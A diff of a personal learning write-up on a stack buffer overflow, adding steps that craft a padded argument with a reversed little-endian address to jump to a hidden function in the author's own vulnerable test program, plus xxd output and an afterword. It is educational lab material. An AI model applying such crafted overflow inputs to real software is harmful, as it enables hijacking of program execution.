@@ -1,5 +1,18 @@
 # Buffer overflow exploit
 
+<!--toc:start-->
+- [Buffer overflow exploit](#buffer-overflow-exploit)
+  - [Hardware](#hardware)
+  - [Code](#code)
+  - [Steps](#steps)
+    - [Compile the Vulnerable Program](#compile-the-vulnerable-program)
+    - [Find the Address of the Hidden Function](#find-the-address-of-the-hidden-function)
+    - [Explore with GDB](#explore-with-gdb)
+    - [The Exploit Plan](#the-exploit-plan)
+    - [Success](#success)
+  - [Afterword](#afterword)
+<!--toc:end-->
+
 **Note**: This is simply a write-up for myself, so that I solidify my
 understanding of the subject.
 
@@ -337,10 +350,33 @@ $ ghci -e 'take 36 $ cycle "12345678"'
 "123456781234567812345678123456781234"
 ```
 
-To add the address to the end of our string we need to
-hex escape then in whatever language we choose. I am
-just going to use some bash magic to pass it as an
-argument.
+To add the address to the end of our string we need to hex escape then in
+whatever language we choose. We will end up with something along the lines of
+`"123456781234567812345678123456781234\x94\x04\x01\x00"`.
+
+I am going to use some shell magic to pass it as an argument. `echo` supports
+hex escape sequences, so that will work for us perfectly. Let's see:
+
+```sh $ echo -e
+'123456781234567812345678123456781234\x94\x04\x01\x00'
+123456781234567812345678123456781234�
+```
+
+Something definitely *has* been resolved. Let's check that it is
+indeed what we think it is.
+
+```sh
+$ echo -e '123456781234567812345678123456781234\x94\x04\x01\x00' | xxd
+00000000: 3132 3334 3536 3738 3132 3334 3536 3738  1234567812345678
+00000010: 3132 3334 3536 3738 3132 3334 3536 3738  1234567812345678
+00000020: 3132 3334 9404 0100 0a                   1234.....
+```
+
+Yeah, looks about right!
+
+### Success
+
+Let's actually try passing that string as an argument:
 
 ```sh
 $ ./vuln $(echo -e '123456781234567812345678123456781234\x94\x04\x01\x00')
@@ -351,14 +387,30 @@ $ echo $?
 139
 ```
 
-Luckily, I do not care that the program does not exit
-gracefully. It works, our exploit was successful.
+WOOOOOOO! 🎉 IT WORKED! Except the part where it did not exit
+cleanly and the warning from `echo`...
 
-Please note that I flipped the bytes in the address
-`0x00010494`. That is, I put `\x94\x04\x01\x00` instead
-of `\x00\x01\x04\x94`. This is essential. Remember? It
-was little endian. This is what would have happened if I
-didn't reverse it:
+Luckily, I do not care, so we are going to ignore all that. It
+works, our exploit was successful.
+
+## Afterword
+
+In practice while trying to achieve this I had spent *way* longer
+trying to figure out what to do then this might make it seem like.
+
+For example, I initially did not realize that I should be
+reversing the bytes due to the little-endianness. This had led me
+to spend the majority of a day on trying to figure out what is
+wrong, and that is what actually brought me to learn how to
+inspect the execution with GDB somewhat thoroughly.
+
+Had I not made that mistake, I probably would have just gotten the
+exploit to work and would have learned much less from it.
+
+Note that I flipped the bytes in the address `0x00010494`. That
+is, I put `\x94\x04\x01\x00` instead of `\x00\x01\x04\x94`. This
+is essential. Remember? It was little endian. This is what would
+have happened if I didn't reverse it:
 
 ```sh
 $ ./vuln $(echo -e '12345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234\x00\x01\x05\x04')
@@ -366,6 +418,5 @@ $ ./vuln $(echo -e '123456781234567812345678123456781234567812345678123456781234
 Segmentation fault
 ```
 
-Exercise to the reader: Step through GDB and check what
-addresses and what registers get overwritten at what
-point.
+Yeah... It just doesn't even overwrite the whole byte because of
+the null byte signifying the end of the string.
